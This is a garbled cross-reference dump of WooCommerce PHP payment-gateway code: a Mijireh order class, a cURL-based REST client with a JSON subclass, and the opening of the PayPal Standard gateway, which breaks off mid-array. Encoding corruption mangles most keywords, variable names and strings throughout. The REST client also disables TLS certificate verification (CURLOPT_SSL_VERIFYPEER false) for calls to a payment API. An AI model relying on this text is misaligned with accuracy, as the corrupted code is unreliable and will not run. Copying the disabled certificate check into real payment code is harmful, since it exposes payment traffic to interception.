$”rÜs
);

191 
public
 
funùiÚ
 
	$add_m‘a_d©a
(
$key
, 
$v®ue
) {

192 if(!
	`is_¬¿y
(
$this
->
_d©a
['meta_data'])) {

193 
$this
->
_d©a
['m‘a_d©a'] = 
	`¬¿y
();

195 
$this
->
_d©a
['m‘a_d©a'][
$key
] = 
$v®ue
;

196 
	}
}

203 
public
 
funùiÚ
 
	$g‘_m‘a_v®ue
(
$key
) {

204 
$v®ue
 = 
çl£
;

205 if(
	`is£t
(
$this
->
_d©a
['m‘a_d©a'][
$key
])) {

206 
$v®ue
 = 
$this
->
_d©a
['m‘a_d©a'][
$key
];

208  
$v®ue
;

209 
	}
}

211 
public
 
funùiÚ
 
	$™em_couÁ
() {

212 
$™em_couÁ
 = 0;

213 if(
	`is_¬¿y
(
$this
->
_d©a
['items'])) {

214 
$™em_couÁ
 = 
	`couÁ
(
$this
->
_d©a
['items']);

216  
$™em_couÁ
;

217 
	}
}

219 
public
 
funùiÚ
 
	$g‘_™ems
() {

220 
$™ems
 = 
	`¬¿y
();

221 
	`fÜ—ch
(
$this
->
_d©a
['™ems'] 
as
 
$™em_d©a
) {

222 
$™em
 = 
Ãw
 
	`Mijœeh_I‹m
();

223 
$™em
->
	`cİy_äom
(
$™em_d©a
);

225 
	}
}

227 
public
 
funùiÚ
 
	$ş—r_™ems
() {

228 
$this
->
_d©a
['™ems'] = 
	`¬¿y
();

229 
	}
}

231 
public
 
funùiÚ
 
	$ş—r_m‘a_d©a
() {

232 
$this
->
_d©a
['m‘a_d©a'] = 
	`¬¿y
();

233 
	}
}

235 
public
 
funùiÚ
 
	$v®id©e
() {

236 
$this
->
	`_check_tÙ®
();

237 
$this
->
	`_check_»tuº_u¾
();

238 
$this
->
	`_check_™ems
();

239  
	`couÁ
(
$this
->
_”rÜs
) == 0;

240 
	}
}

245 
public
 
funùiÚ
 
	$£t_add»ss
(
Mijœeh_Add»ss
 
$add»ss
){

246 
$this
->
	`£t_shpšg_add»ss
(
$add»ss
);

247 
	}
}

249 
public
 
funùiÚ
 
	$£t_shpšg_add»ss
(
Mijœeh_Add»ss
 
$add»ss
) {

250 if(
$add»ss
->
	`v®id©e
()) {

251 
$this
->
_d©a
['shpšg_add»ss'] = 
$add»ss
->
	`g‘_d©a
();

254 
throw
 
Ãw
 
	`Mijœeh_Exû±iÚ
('invalid shipping‡ddress');

256 
	}
}

258 
public
 
funùiÚ
 
	$£t_blšg_add»ss
(
Mijœeh_Add»ss
 
$add»ss
) {

259 if(
$add»ss
->
	`v®id©e
()) {

260 
$this
->
_d©a
['blšg_add»ss'] = 
$add»ss
->
	`g‘_d©a
();

263 
throw
 
Ãw
 
	`Mijœeh_Exû±iÚ
('invalid shipping‡ddress');

265 
	}
}

270 
public
 
funùiÚ
 
	$g‘_add»ss
() {

271  
$this
->
	`g‘_shpšg_add»ss
();

272 
	}
}

274 
public
 
funùiÚ
 
	$g‘_shpšg_add»ss
() {

275 
$add»ss
 = 
çl£
;

276 if(
	`is_¬¿y
(
$this
->
_d©a
['shipping_address'])) {

277 
$add»ss
 = 
Ãw
 
	`Mijœeh_Add»ss
();

278 
$add»ss
->
	`cİy_äom
(
$this
->
_d©a
['shipping_address']);

280  
$add»ss
;

281 
	}
}

283 
public
 
funùiÚ
 
	$g‘_blšg_add»ss
() {

284 
$add»ss
 = 
çl£
;

285 if(
	`is_¬¿y
(
$this
->
_d©a
['billing_address'])) {

286 
$add»ss
 = 
Ãw
 
	`Mijœeh_Add»ss
();

287 
$add»ss
->
	`cİy_äom
(
$this
->
_d©a
['billing_address']);

289  
$add»ss
;

290 
	}
}

299 
´iv©e
 
funùiÚ
 
	$_check_tÙ®
() {

300 
$is_v®id
 = 
Œue
;

301 if(
$this
->
_d©a
['total'] <= 0) {

302 
$this
->
	`add_”rÜ
('orderotal must be greaterhan zero');

303 
$is_v®id
 = 
çl£
;

305  
$is_v®id
;

306 
	}
}

315 
´iv©e
 
funùiÚ
 
	$_check_»tuº_u¾
() {

316 
$is_v®id
 = 
çl£
;

317 if(!
	`em±y
(
$this
->
_d©a
['return_url'])) {

318 
$u¾
 = 
$this
->
_d©a
['return_url'];

319 if('h‰p' =ğ
	`¡¹Şow”
(
	`sub¡r
(
$u¾
, 0, 4))) {

320 
$is_v®id
 = 
Œue
;

323 
$this
->
	`add_”rÜ
('return url is invalid');

327 
$this
->
	`add_”rÜ
('return url is„equired');

329  
$is_v®id
;

330 
	}
}

339 
´iv©e
 
funùiÚ
 
	$_check_™ems
() {

340 
$is_v®id
 = 
Œue
;

341 if(
	`couÁ
(
$this
->
_d©a
['items']) <= 0) {

342 
$is_v®id
 = 
çl£
;

343 
$this
->
	`add_”rÜ
('the order must contain‡t†east one item');

345  
$is_v®id
;

346 
	}
}

	@includes/gateways/mijireh/includes/Rest.php

1 <?
php


10 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

12 şas 
	cMijœeh_Re¡
 {

14 
public
 
	m$cu¾_İts
 = 
¬¿y
(

15 
CURLOPT_RETURNTRANSFER
 => 
Œue
,

16 
CURLOPT_SSL_VERIFYPEER
 => 
çl£
,

17 
CURLOPT_MAXREDIRS
 => 10

20 
public
 
	m$ba£_u¾
;

22 
public
 
	m$Ï¡_»¥Ú£
;

23 
public
 
	m$Ï¡_»que¡
;

25 
public
 
	m$throw_exû±iÚs
 = 
Œue
;

27 
public
 
funùiÚ
 
	$__cÚ¡ruù
(
$ba£_u¾
, 
$cu¾_İtiÚs
=
nuÎ
) {

28 ià(!
	`funùiÚ_exi¡s
('curl_init')) {

29 
throw
 
Ãw
 
	`Exû±iÚ
('CURL module‚ot‡vailable! Mijireh_Rest„equires CURL. See http://php.net/manual/en/book.curl.php');

32 if(
	`is£t
(
$cu¾_İtiÚs
è&& 
	`is_¬¿y
($curl_options)) {

33 
	`fÜ—ch
(
$cu¾_İtiÚs
 
as
 
$key
 => 
$v®ue
) {

35 if(
$key
 == 'CURLOPT_FOLLOWLOCATION') {

37 if(
	`ši_g‘
('open_basedir') == '' && !ini_get('safe_mode')) {

38 
$this
->
cu¾_İts
['CURLOPT_FOLLOWLOCATION'] = 
Œue
;

42 
$this
->
cu¾_İts
[
$key
] = 
$v®ue
;

49 
$this
->
ba£_u¾
 = 
$ba£_u¾
;

53 
public
 
funùiÚ
 
	`£tupAuth
(
$u£r
, 
$·ss
, 
$auth
 = 'basic') {

54 
$this
->
cu¾_İts
[
CURLOPT_HTTPAUTH
] = 
	`cÚ¡ªt
('CURLAUTH_'.
	`¡¹ouµ”
(
$auth
));

55 
$this
->
cu¾_İts
[
CURLOPT_USERPWD
] = 
$u£r
 . ":" . 
$·ss
;

56 
	}
}

58 
public
 
funùiÚ
 
	$g‘
(
$u¾
) {

59 
$cu¾
 = 
$this
->
	`´•Reque¡
($this->
cu¾_İts
, 
$u¾
);

60 
$body
 = 
$this
->
	`doReque¡
(
$cu¾
);

62 
$body
 = 
$this
->
	`´oûssBody
($body);

64  
$body
;

65 
	}
}

67 
public
 
funùiÚ
 
po¡
(
$u¾
, 
$d©a
, 
$h—d”s
=
	$¬¿y
()) {

68 
$d©a
 = (
	`is_¬¿y
($d©a)è? 
	`h‰p_bud_qu”y
($data) : $data;

70 
$cu¾_İts
 = 
$this
->
cu¾_İts
;

71 
$cu¾_İts
[
CURLOPT_CUSTOMREQUEST
] = 'POST';

72 
$h—d”s
[] = 'CÚ‹Á-L’gth: '.
	`¡¾’
(
$d©a
);

73 
$cu¾_İts
[
CURLOPT_HTTPHEADER
] = 
$h—d”s
;

74 
$cu¾_İts
[
CURLOPT_POSTFIELDS
] = 
$d©a
;

76 
$cu¾
 = 
$this
->
	`´•Reque¡
(
$cu¾_İts
, 
$u¾
);

77 
$body
 = 
$this
->
	`doReque¡
(
$cu¾
);

79 
$body
 = 
$this
->
	`´oûssBody
($body);

81  
$body
;

82 
	}
}

84 
public
 
funùiÚ
 
put
(
$u¾
, 
$d©a
, 
$h—d”s
=
	$¬¿y
()) {

85 
$d©a
 = (
	`is_¬¿y
($d©a)è? 
	`h‰p_bud_qu”y
($data) : $data;

87 
$cu¾_İts
 = 
$this
->
cu¾_İts
;

88 
$cu¾_İts
[
CURLOPT_CUSTOMREQUEST
] = 'PUT';

89 
$h—d”s
[] = 'CÚ‹Á-L’gth: '.
	`¡¾’
(
$d©a
);

90 
$cu¾_İts
[
CURLOPT_HTTPHEADER
] = 
$h—d”s
;

91 
$cu¾_İts
[
CURLOPT_POSTFIELDS
] = 
$d©a
;

93 
$cu¾
 = 
$this
->
	`´•Reque¡
(
$cu¾_İts
, 
$u¾
);

94 
$body
 = 
$this
->
	`doReque¡
(
$cu¾
);

96 
$body
 = 
$this
->
	`´oûssBody
($body);

98  
$body
;

99 
	}
}

101 
public
 
funùiÚ
 
	$d–‘e
(
$u¾
) {

102 
$cu¾_İts
 = 
$this
->
cu¾_İts
;

103 
$cu¾_İts
[
CURLOPT_CUSTOMREQUEST
] = 'DELETE';

105 
$cu¾
 = 
$this
->
	`´•Reque¡
(
$cu¾_İts
, 
$u¾
);

106 
$body
 = 
$this
->
	`doReque¡
(
$cu¾
);

108 
$body
 = 
$this
->
	`´oûssBody
($body);

110  
$body
;

111 
	}
}

113 
public
 
funùiÚ
 
	$Ï¡Body
() {

114  
$this
->
Ï¡_»¥Ú£
['body'];

115 
	}
}

117 
public
 
funùiÚ
 
	$Ï¡Stus
() {

118  
$this
->
Ï¡_»¥Ú£
['meta']['http_code'];

119 
	}
}

121 
´Ùeùed
 
funùiÚ
 
	$´oûssBody
(
$body
) {

125  
$body
;

126 
	}
}

128 
´Ùeùed
 
funùiÚ
 
	$´oûssE¼Ü
(
$body
) {

133  
$body
;

134 
	}
}

137 
´Ùeùed
 
funùiÚ
 
	$´•Reque¡
(
$İts
, 
$u¾
) {

138 ià(
	`¡ºcmp
(
$u¾
, 
$this
->
ba£_u¾
, 
	`¡¾’
($this->base_url)) != 0) {

139 
$u¾
 = 
$this
->
ba£_u¾
 . $url;

141 
$cu¾
 = 
	`cu¾_š™
(
$u¾
);

143 
	`fÜ—ch
 (
$İts
 
as
 
$İt
 => 
$v®
) {

144 @
	`cu¾_£tİt
(
$cu¾
, 
$İt
, 
$v®
);

147 
$this
->
Ï¡_»que¡
 = 
	`¬¿y
(

148 'u¾' => 
$u¾


151 ià(
	`is£t
(
$İts
[
CURLOPT_CUSTOMREQUEST
]))

152 
$this
->
Ï¡_»que¡
['m‘hod'] = 
$İts
[
CURLOPT_CUSTOMREQUEST
];

154 
$this
->
Ï¡_»que¡
['method'] = 'GET';

156 ià(
	`is£t
(
$İts
[
CURLOPT_POSTFIELDS
]))

157 
$this
->
Ï¡_»que¡
['d©a'] = 
$İts
[
CURLOPT_POSTFIELDS
];

159  
$cu¾
;

160 
	}
}

162 
´iv©e
 
funùiÚ
 
	$doReque¡
(
$cu¾
) {

164 
$body
 = 
	`cu¾_exec
(
$cu¾
);

165 
$m‘a
 = 
	`cu¾_g‘šfo
(
$cu¾
);

167 
$this
->
Ï¡_»¥Ú£
 = 
	`¬¿y
(

168 'body' => 
$body
,

169 'm‘a' => 
$m‘a


172 
	`cu¾_şo£
(
$cu¾
);

174 
$this
->
	`checkLa¡Re¥Ú£FÜE¼Ü
();

176  
$body
;

177 
	}
}

179 
´Ùeùed
 
funùiÚ
 
	$checkLa¡Re¥Ú£FÜE¼Ü
() {

180 iàĞ!
$this
->
throw_exû±iÚs
)

183 
$m‘a
 = 
$this
->
Ï¡_»¥Ú£
['meta'];

184 
$body
 = 
$this
->
Ï¡_»¥Ú£
['body'];

186 ià(!
$m‘a
)

189 
$”r
 = 
nuÎ
;

190 
$m‘a
['http_code']) {

192 
throw
 
Ãw
 
	`Mijœeh_Re¡_BadReque¡
(
$this
->
	`´oûssE¼Ü
(
$body
));

195 
throw
 
Ãw
 
	`Mijœeh_Re¡_UÇuthÜized
(
$this
->
	`´oûssE¼Ü
(
$body
));

198 
throw
 
Ãw
 
	`Mijœeh_Re¡_FÜbidd’
(
$this
->
	`´oûssE¼Ü
(
$body
));

201 
throw
 
Ãw
 
	`Mijœeh_Re¡_NÙFound
(
$this
->
	`´oûssE¼Ü
(
$body
));

204 
throw
 
Ãw
 
	`Mijœeh_Re¡_M‘hodNÙAÎowed
(
$this
->
	`´oûssE¼Ü
(
$body
));

207 
throw
 
Ãw
 
	`Mijœeh_Re¡_CÚæiù
(
$this
->
	`´oûssE¼Ü
(
$body
));

210 
throw
 
Ãw
 
	`Mijœeh_Re¡_GÚe
(
$this
->
	`´oûssE¼Ü
(
$body
));

218 
throw
 
Ãw
 
	`Mijœeh_Re¡_Inv®idRecÜd
(
$this
->
	`´oûssE¼Ü
(
$body
));

221 ià(
$m‘a
['http_code'] >= 400 && $meta['http_code'] <= 499)

222 
throw
 
Ãw
 
	`Mijœeh_Re¡_Cl›ÁE¼Ü
(
$this
->
	`´oûssE¼Ü
(
$body
));

223 
	`–£if
 (
$m‘a
['http_code'] >= 500 && $meta['http_code'] <= 599)

224 
throw
 
Ãw
 
	`Mijœeh_Re¡_S”v”E¼Ü
(
$this
->
	`´oûssE¼Ü
(
$body
));

225 
	`–£if
 (!
$m‘a
['http_code'] || $meta['http_code'] >= 600) {

226 
throw
 
Ãw
 
	`Mijœeh_Re¡_UnknownRe¥Ú£
(
$this
->
	`´oûssE¼Ü
(
$body
));

229 
	}
}

233 şas 
	cMijœeh_Re¡_Exû±iÚ
 
ex‹nds
 
	mExû±iÚ
 { }

234 şas 
	cMijœeh_Re¡_UnknownRe¥Ú£
 
ex‹nds
 
	mMijœeh_Re¡_Exû±iÚ
 { }

236  cÏs 
	cMijœeh_Re¡_Cl›ÁE¼Ü
 
ex‹nds
 
	mMijœeh_Re¡_Exû±iÚ
 {}

237  cÏs 
	cMijœeh_Re¡_BadReque¡
 
ex‹nds
 
	mMijœeh_Re¡_Cl›ÁE¼Ü
 {}

238  cÏs 
	cMijœeh_Re¡_UÇuthÜized
 
ex‹nds
 
	mMijœeh_Re¡_Cl›ÁE¼Ü
 {}

239  cÏs 
	cMijœeh_Re¡_FÜbidd’
 
ex‹nds
 
	mMijœeh_Re¡_Cl›ÁE¼Ü
 {}

240  cÏs 
	cMijœeh_Re¡_NÙFound
 
ex‹nds
 
	mMijœeh_Re¡_Cl›ÁE¼Ü
 {}

241  cÏs 
	cMijœeh_Re¡_M‘hodNÙAÎowed
 
ex‹nds
 
	mMijœeh_Re¡_Cl›ÁE¼Ü
 {}

242  cÏs 
	cMijœeh_Re¡_CÚæiù
 
ex‹nds
 
	mMijœeh_Re¡_Cl›ÁE¼Ü
 {}

243  cÏs 
	cMijœeh_Re¡_GÚe
 
ex‹nds
 
	mMijœeh_Re¡_Cl›ÁE¼Ü
 {}

244  cÏs 
	cMijœeh_Re¡_Inv®idRecÜd
 
ex‹nds
 
	mMijœeh_Re¡_Cl›ÁE¼Ü
 {}

246  cÏs 
	cMijœeh_Re¡_S”v”E¼Ü
 
ex‹nds
 
	mMijœeh_Re¡_Exû±iÚ
 {}

	@includes/gateways/mijireh/includes/RestJSON.php

1 <?
php


3 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

5 şas 
	cMijœeh_Re¡JSON
 
ex‹nds
 
	mMijœeh_Re¡
 {

7 
public
 
funùiÚ
 
po¡
(
$u¾
, 
$d©a
, 
$h—d”s
=
	$¬¿y
()) {

8  
·»Á
::
	`po¡
(
$u¾
, 
	`jsÚ_’code
(
$d©a
), 
$h—d”s
);

11 
public
 
funùiÚ
 
	`put
(
$u¾
, 
$d©a
, 
$h—d”s
=
	$¬¿y
()) {

12  
·»Á
::
	`put
(
$u¾
, 
	`jsÚ_’code
(
$d©a
), 
$h—d”s
);

13 
	}
}

15 
´Ùeùed
 
funùiÚ
 
	$´•Reque¡
(
$İts
, 
$u¾
) {

16 
$İts
[
CURLOPT_HTTPHEADER
][] = 'Accept:‡pplication/json';

17 
$İts
[
CURLOPT_HTTPHEADER
][] = 'Content-Type:‡pplication/json';

18  
·»Á
::
	`´•Reque¡
(
$İts
, 
$u¾
);

19 
	}
}

21 
public
 
funùiÚ
 
	$´oûssBody
(
$body
) {

22  
	`jsÚ_decode
(
$body
, 
Œue
);

23 
	}
}

	@includes/gateways/paypal/class-wc-gateway-paypal.php

1 <?
php


3 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

16 şas 
	cWC_G©eway_Pay·l
 
ex‹nds
 
	mWC_Paym’t_G©eway
 {

18 
v¬
 
	m$nÙify_u¾
;

26 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

28 
$this
->
id
 = 'paypal';

29 
$this
->
icÚ
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_·y·l_icÚ', 
	`WC
()->
	`¶ugš_u¾
() . '/assets/images/icons/paypal.png' );

30 
$this
->
has_f›lds
 = 
çl£
;

31 
$this
->
Üd”_bu‰Ú_‹xt
 = 
	`__
( 'Proceedo PayPal', 'woocommerce' );

32 
$this
->
liveu¾
 = 'https://www.paypal.com/cgi-bin/webscr';

33 
$this
->
‹¡u¾
 = 'https://www.sandbox.paypal.com/cgi-bin/webscr';

34 
$this
->
m‘hod_t™Ë
 = 
	`__
( 'PayPal', 'woocommerce' );

35 
$this
->
nÙify_u¾
 = 
	`WC
()->
	`­i_»que¡_u¾
( 'WC_Gateway_Paypal' );

38 
$this
->
	`š™_fÜm_f›lds
();

39 
$this
->
	`š™_£‰šgs
();

42 
$this
->
t™Ë
 = $this->
	`g‘_İtiÚ
( 'title' );

43 
$this
->
desütiÚ
 = $this->
	`g‘_İtiÚ
( 'description' );

44 
$this
->
ema
 = $this->
	`g‘_İtiÚ
( 'email' );

45 
$this
->
»ûiv”_ema
 = $this->
	`g‘_İtiÚ
Ğ'»ûiv”_ema', $this->
ema
 );

46 
$this
->
‹¡mode
 = $this->
	`g‘_İtiÚ
( 'testmode' );

47 
$this
->
£nd_shpšg
 = $this->
	`g‘_İtiÚ
( 'send_shipping' );

48 
$this
->
add»ss_ov”ride
 = $this->
	`g‘_İtiÚ
( 'address_override' );

49 
$this
->
debug
 = $this->
	`g‘_İtiÚ
( 'debug' );

50 
$this
->
fÜm_submissiÚ_m‘hod
 = $this->
	`g‘_İtiÚ
Ğ'fÜm_submissiÚ_m‘hod' ) =ğ'yes' ? 
Œue
 : 
çl£
;

51 
$this
->
·ge_¡yË
 = $this->
	`g‘_İtiÚ
( 'page_style' );

52 
$this
->
švoiû_´efix
 = $this->
	`g‘_İtiÚ
( 'invoice_prefix', 'WC-' );

53 
$this
->
·ym’ùiÚ
 = $this->
	`g‘_İtiÚ
( 'paymentaction', 'sale' );

54 
$this
->
id’t™y_tok’
 = $this->
	`g‘_İtiÚ
( 'identity_token', '' );

57 iàĞ'yes' =ğ
$this
->
debug
 ) {

58 
$this
->
log
 = 
Ãw
 
	`WC_Logg”
();

62 
	`add_aùiÚ
Ğ'v®id-·y·l-¡ªd¬d-n-»que¡', 
	`¬¿y
Ğ
$this
, 'successful_request' ) );

63 
	`add_aùiÚ
Ğ'woocomm”û_»ût_·y·l', 
	`¬¿y
Ğ
$this
, 'receipt_page' ) );

64 
	`add_aùiÚ
Ğ'woocomm”û_upd©e_İtiÚs_·ym’t_g©eways_' . 
$this
->
id
, 
	`¬¿y
( $this, 'process_admin_options' ) );

65 
	`add_aùiÚ
Ğ'woocomm”û_thªkyou_·y·l', 
	`¬¿y
Ğ
$this
, 'pdt_return_handler' ) );

68 
	`add_aùiÚ
Ğ'woocomm”û_­i_wc_g©eway_·y·l', 
	`¬¿y
Ğ
$this
, 'check_ipn_response' ) );

70 iàĞ! 
$this
->
	`is_v®id_fÜ_u£
() ) {

71 
$this
->
’abËd
 = 
çl£
;

81 
funùiÚ
 
	$is_v®id_fÜ_u£
() {

82 iàĞ! 
	`š_¬¿y
Ğ
	`g‘_woocomm”û_cu¼’cy
(), 
	`­¶y_f‹rs
Ğ'woocomm”û_·y·l_suµÜ‹d_cu¼’c›s', 
	`¬¿y
( 'AUD', 'BRL', 'CAD', 'MXN', 'NZD', 'HKD', 'SGD', 'USD', 'EUR', 'JPY', 'TRY', 'NOK', 'CZK', 'DKK', 'HUF', 'ILS', 'MYR', 'PHP', 'PLN', 'SEK', 'CHF', 'TWD', 'THB', 'GBP', 'RMB', 'RUB' ) ) ) ) {

83  
çl£
;

86  
Œue
;

87 
	}
}

95 
public
 
funùiÚ
 
	$admš_İtiÚs
() {

98 <
h3
><?
php
 
	`_e
( 'PayPal standard', 'woocommerce' ); ?></h3>

99 <
p
><?
php
 
	`_e
( 'PayPal standard works by sendinghe usero PayPaloƒnterheir…ayment information.', 'woocommerce' ); ?></p>

101 <?
php
 iàĞ
$this
->
	`is_v®id_fÜ_u£
() ) : ?>

103 <
bË
 
şass
="form-table">

104 <?
php


106 
$this
->
	`g’”©e_£‰šgs_html
();

108 </
bË
><!--/.
fÜm
-table-->

110 <?
php
 : ?>

111 <
div
 
şass
="šlš”rÜ"><
p
><
¡rÚg
><?
php
 
	`_e
( 'Gateway Disabled', 'woocommerce' ); ?></strong>: <?php _e( 'PayPal does‚ot support your store currency.', 'woocommerce' ); ?></p></div>

112 <?
php


113 
’dif
;

114 
	}
}

122 
funùiÚ
 
	$š™_fÜm_f›lds
() {

124 
$this
->
fÜm_f›lds
 = 
	`¬¿y
(

125 '’abËd' => 
	`¬¿y
(

126 't™Ë' => 
	`__
( 'Enable/Disable', 'woocommerce' ),

128 'Ïb–' => 
	`__
( 'Enable PayPal standard', 'woocommerce' ),

131 't™Ë' => 
	`¬¿y
(

132 't™Ë' => 
	`__
( 'Title', 'woocommerce' ),

134 'desütiÚ' => 
	`__
( 'This controlsheitle whichhe user sees during checkout.', 'woocommerce' ),

135 'deçuÉ' => 
	`__
( 'PayPal', 'woocommerce' ),

136 'desc_t' => 
Œue
,

138 'desütiÚ' => 
	`¬¿y
(

139 't™Ë' => 
	`__
( 'Description', 'woocommerce' ),

141 'desütiÚ' => 
	`__
( 'This controlshe description whichhe user sees during checkout.', 'woocommerce' ),

142 'deçuÉ' => 
	`__
( 'Pay via PayPal; you can…ay with your credit card if you don\'t have‡ PayPal‡ccount', 'woocommerce' )

144 'ema' => 
	`¬¿y
(

145 't™Ë' => 
	`__
( 'PayPal Email', 'woocommerce' ),

147 'desütiÚ' => 
	`__
( 'Pleaseƒnter your PayPalƒmail‡ddress;his is‚eeded in orderoake…ayment.', 'woocommerce' ),

149 'desc_t' => 
Œue
,

152 '»ûiv”_ema' => 
	`¬¿y
(

153 't™Ë' => 
	`__
( 'Receiver Email', 'woocommerce' ),

155 'desütiÚ' => 
	`__
( 'Ifhis differs fromheƒmailƒntered‡bove, input your main„eceiverƒmail for your PayPal‡ccount. This is usedo validate IPN„equests.', 'woocommerce' ),

157 'desc_t' => 
Œue
,

160 'id’t™y_tok’' => 
	`¬¿y
(

161 't™Ë' => 
	`__
( 'PayPal Identity Token', 'woocommerce' ),

163 'desütiÚ' => 
	`__
( 'Optionallyƒnable "Payment Data Transfer" (Profile > Website Payment Preferences)‡ndhen copy your identityoken here. This will‡llow…aymentso be verified withouthe‚eed for PayPal IPN.', 'woocommerce' ),

165 'desc_t' => 
Œue
,

166 '¶aûhŞd”' => 
	`__
( 'Optional', 'woocommerce' )

168 'švoiû_´efix' => 
	`¬¿y
(

169 't™Ë' => 
	`__
( 'Invoice Prefix', 'woocommerce' ),

171 'desütiÚ' => 
	`__
( 'Pleaseƒnter‡…refix for your invoice‚umbers. If you use your PayPal‡ccount for multiple storesƒnsurehis…refix is unique‡s PayPal will‚ot‡llow orders withhe same invoice‚umber.', 'woocommerce' ),

173 'desc_t' => 
Œue
,

175 '·ym’ùiÚ' => 
	`¬¿y
(

176 't™Ë' => 
	`__
( 'Payment Action', 'woocommerce' ),

178 'desütiÚ' => 
	`__
( 'Choose whether you wisho capture funds immediately or‡uthorize…ayment only.', 'woocommerce' ),

180 'desc_t' => 
Œue
,

181 'İtiÚs' => 
	`¬¿y
(

182 '§Ë' => 
	`__
( 'Capture', 'woocommerce' ),

183 'authÜiz©iÚ' => 
	`__
( 'Authorize', 'woocommerce' )

186 'fÜm_submissiÚ_m‘hod' => 
	`¬¿y
(

187 't™Ë' => 
	`__
( 'Submission method', 'woocommerce' ),

189 'Ïb–' => 
	`__
( 'Use form submission method.', 'woocommerce' ),

190 'desütiÚ' => 
	`__
( 'Enablehiso…ost order datao PayPal via‡ form instead of using‡„edirect/querystring.', 'woocommerce' ),

193 '·ge_¡yË' => 
	`¬¿y
(

194 't™Ë' => 
	`__
( 'Page Style', 'woocommerce' ),

196 'desütiÚ' => 
	`__
( 'Optionallyƒnterhe‚ame ofhe…age style you wisho use. These‡re defined within your PayPal‡ccount.', 'woocommerce' ),

198 'desc_t' => 
Œue
,

199 '¶aûhŞd”' => 
	`__
( 'Optional', 'woocommerce' )

201 'shpšg' => 
	`¬¿y
(

202 't™Ë' => 
	`__
( 'Shipping options', 'woocommerce' ),

206 '£nd_shpšg' => 
	`¬¿y
(

207 't™Ë' => 
	`__
( 'Shipping details', 'woocommerce' ),

209 'Ïb–' => 
	`__
( 'Send shipping detailso PayPal instead of billing.', 'woocommerce' ),

210 'desütiÚ' => 
	`__
( 'PayPal‡llows uso send 1‡ddress. If you‡re using PayPal for shipping†abels you may…refero sendhe shipping‡ddress„atherhan billing.', 'woocommerce' ),

213 'add»ss_ov”ride' => 
	`¬¿y
(

214 't™Ë' => 
	`__
( 'Address override', 'woocommerce' ),

216 'Ïb–' => 
	`__
( 'Enable "address_override"o…revent‡ddress information from being changed.', 'woocommerce' ),

217 'desütiÚ' => 
	`__
( 'PayPal verifies‡ddresseshereforehis setting can causeƒrrors (we„ecommend keeping it disabled).', 'woocommerce' ),

220 '‹¡šg' => 
	`¬¿y
(

221 't™Ë' => 
	`__
( 'Gateway Testing', 'woocommerce' ),

225 '‹¡mode' => 
	`¬¿y
(

226 't™Ë' => 
	`__
( 'PayPal sandbox', 'woocommerce' ),

228 'Ïb–' => 
	`__
( 'Enable PayPal sandbox', 'woocommerce' ),

230 'desütiÚ' => 
	`¥rštf
Ğ
	`__
( 'PayPal sandbox can be usedoest…ayments. Sign up for‡ developer‡ccount <a href="%s">here</a>.', 'woocommerce' ), 'https://developer.paypal.com/' ),

232 'debug' => 
	`¬¿y
(

233 't™Ë' => 
	`__
( 'Debug Log', 'woocommerce' ),

235 'Ïb–' => 
	`__
( 'Enable†ogging', 'woocommerce' ),

237 'desütiÚ' => 
	`¥rštf
Ğ
	`__
Ğ'Log PayP®ƒv’ts, such‡ IPN„eque¡s, insid<code>woocomm”û/logs/·y·l-%s.txt</code>', 'woocomm”û' ), 
	`§n™ize_fe_Çme
Ğ
	`wp_hash
( 'paypal' ) ) ),

240 
	}
}

247 
public
 
funùiÚ
 
	$·y·l_™em_Çme
Ğ
$™em_Çme
 ) {

248 iàĞ
	`¡¾’
Ğ
$™em_Çme
 ) > 127 ) {

249 
$™em_Çme
 = 
	`sub¡r
( $item_name, 0, 124 ) . '...';

251  
	`html_’t™y_decode
Ğ
$™em_Çme
, 
ENT_NOQUOTES
, 'UTF-8' );

252 
	}
}

261 
funùiÚ
 
	$g‘_·y·l_¬gs
Ğ
$Üd”
 ) {

263 
$Üd”_id
 = 
$Üd”
->
id
;

265 iàĞ'yes' =ğ
$this
->
debug
 ) {

266 
$this
->
log
->
	`add
Ğ'·y·l', 'G’”©šg…aym’ˆfÜm fÜ ord” ' . 
$Üd”
->
	`g‘_Üd”_numb”
(è. '. NÙify URL: ' . $this->
nÙify_u¾
 );

269 iàĞ
	`š_¬¿y
Ğ
$Üd”
->
blšg_couÁry
, 
	`¬¿y
( 'US','CA' ) ) ) {

270 
$Üd”
->
blšg_phÚe
 = 
	`¡r_»¶aû
Ğ
	`¬¿y
( '(', '-', ' ', ')', '.' ), '', $order->billing_phone );

271 
$phÚe_¬gs
 = 
	`¬¿y
(

272 'night_phÚe_a' => 
	`sub¡r
Ğ
$Üd”
->
blšg_phÚe
, 0, 3 ),

273 'night_phÚe_b' => 
	`sub¡r
Ğ
$Üd”
->
blšg_phÚe
, 3, 3 ),

274 'night_phÚe_c' => 
	`sub¡r
Ğ
$Üd”
->
blšg_phÚe
, 6, 4 ),

275 'day_phÚe_a' => 
	`sub¡r
Ğ
$Üd”
->
blšg_phÚe
, 0, 3 ),

276 'day_phÚe_b' => 
	`sub¡r
Ğ
$Üd”
->
blšg_phÚe
, 3, 3 ),

277 'day_phÚe_c' => 
	`sub¡r
Ğ
$Üd”
->
blšg_phÚe
, 6, 4 )

280 
$phÚe_¬gs
 = 
	`¬¿y
(

281 'night_phÚe_b' => 
$Üd”
->
blšg_phÚe
,

282 'day_phÚe_b' => 
$Üd”
->
blšg_phÚe


287 
$·y·l_¬gs
 = 
	`¬¿y_m”ge
(

288 
	`¬¿y
(

290 'busšess' => 
$this
->
ema
,

292 'cu¼’cy_code' => 
	`g‘_woocomm”û_cu¼’cy
(),

294 'rm' => 
	`is_s¦
() ? 2 : 1,

296 '»tuº' => 
	`esc_u¾
Ğ
	`add_qu”y_¬g
Ğ'utm_noov”ride', '1', 
$this
->
	`g‘_»tuº_u¾
Ğ
$Üd”
 ) ) ),

297 'ÿnûl_»tuº' => 
	`esc_u¾
Ğ
$Üd”
->
	`g‘_ÿnûl_Üd”_u¾
() ),

298 '·ge_¡yË' => 
$this
->
·ge_¡yË
,

299 '·ym’ùiÚ' => 
$this
->
·ym’ùiÚ
,

303 'švoiû' => 
$this
->
švoiû_´efix
 . 
	`Érim
Ğ
$Üd”
->
	`g‘_Üd”_numb”
(), '#' ),

304 'cu¡om' => 
	`£rŸlize
Ğ
	`¬¿y
Ğ
$Üd”_id
, 
